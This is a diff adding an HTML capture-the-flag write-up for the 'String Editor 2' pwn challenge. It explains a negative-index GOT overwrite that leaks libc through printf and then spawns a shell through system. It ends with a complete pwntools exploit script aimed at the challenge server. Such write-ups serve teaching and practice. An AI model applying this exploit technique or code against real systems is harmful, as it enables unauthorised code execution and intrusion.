@@ -1,0 +1,136 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>String Editor 2 300pts</h1>
+            <h2>July 2021</h2>
+            <h4>Out of Bounds Got Overwrite</h4>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+    The last version was WAY too vulnerable. Who had the idea to leave debug info in? Changelog:
+    <br><br>
+    - removed debug info<br>
+    - new sponsors who won't leak our secrets<br>
+    - ui improvements<br><br>
+    - new util tab<br>
+    - you can't edit stuff other than your string anymore<br>
+    <a href=../../docs/imaginary/string_editor2>string_editor2</a>
+    <br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit. We also get a libc, so before starting the challenge we have to link the binary to the custom libc. 
+        <br>
+    	This challenge gives us an area of memory stored in the heap that we can manipulate one character at a time, similarly to pressing 'r' on vim when hovering over a character. Just in this case this is done via an index in the string. For this challenge they added a check that made sure we could no longer allocate at indexes higher than the string, however they did not fix the vulnerability of allocating at negative offset from the string. Additionally the string is now stored in the data section, and accessing index 15 opens a menu instead of just freeing the string. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/imaginary/write_2a.png" alt="">
+</div>
+<div>
+    <img src="../imgs/imaginary/write_2b.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        The admire your string option just prints out the string using puts and the delete option just overwrites our string with "***************". Additionally we no longer have a libc leak, so overwriting a hook is no longer so easy. At least the string is in the data section, and pie is not enabled, so we can interact with the binary code, the got table and anything else in the data section. 
+        <br><br>
+        This challenge actually took us quite a while since we explored multiple different avenues before finally settling on the correct solution. I ended up solving the challenge together with Playoff-rondo from our team K3RN3L4RMY. 
+        <br><br>
+    </p>
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Since our the target is in the data section and above the got table, we can access a negative index and overwrite a got function. Strcpy is a good target since it is only called when we call the delete function. Our initial idea was to overwrite the address with the address of a one gadget. Without a libc leak, this would however have needed a 2 byte bruteforce, which did not work out great over remote. 
+        <br><br>
+        If instead we overwrite strcpy got with the address of printf-plt (which we have since the binary is not position independent), overwrite the target with a format specifier and then call strcpy(target), we can leak a libc address. This means that we no longer have to bruteforce, yay!
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/imaginary/write_2c.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        The difficult part is now done. The rest of the exploit is very similar to the first string editor challenge. We just overwrite strcpy got with system, overwrite the target with '/bin/sh\0', and call strcpy(target) to get a shell. <br><br>
+        The full exploit is posted below. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/imaginary/write_2d.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+from pwn import *
+elf = context.binary = ELF('./vuln')
+libc = elf.libc
+
+local = False
+
+if local:
+    p = elf.process()
+else:
+    host = 'chal.imaginaryctf.org'
+    port = 42005
+    p = remote(host,port)
+
+def arb_write(val,diff):
+    i = 0
+    for c in val:
+        p.sendline(str(diff + i))
+        p.sendline(p8(c))
+        i+=1
+
+target = 0x601080
+strcpy = 0x601018
+diff = (strcpy - target)
+
+leak_me = b"%13$p."
+binsh = b'/bin/sh\0'
+
+arb_write(p64(0x400600),diff)
+arb_write(leak_me,0)
+
+p.sendline('15')
+p.sendline('2')
+
+p.recvuntil('Exit\n')
+data = p.recvuntil('.').strip()[:-1]
+libc.address = int(data,16) - 0x270b3
+system = p64(libc.sym.system)
+print("[+] Libc Address: " + hex(libc.address))
+
+arb_write(binsh,0)
+arb_write(p64(libc.sym.system),diff)
+
+p.sendline('15')
+p.sendline('2')
+
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
+
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
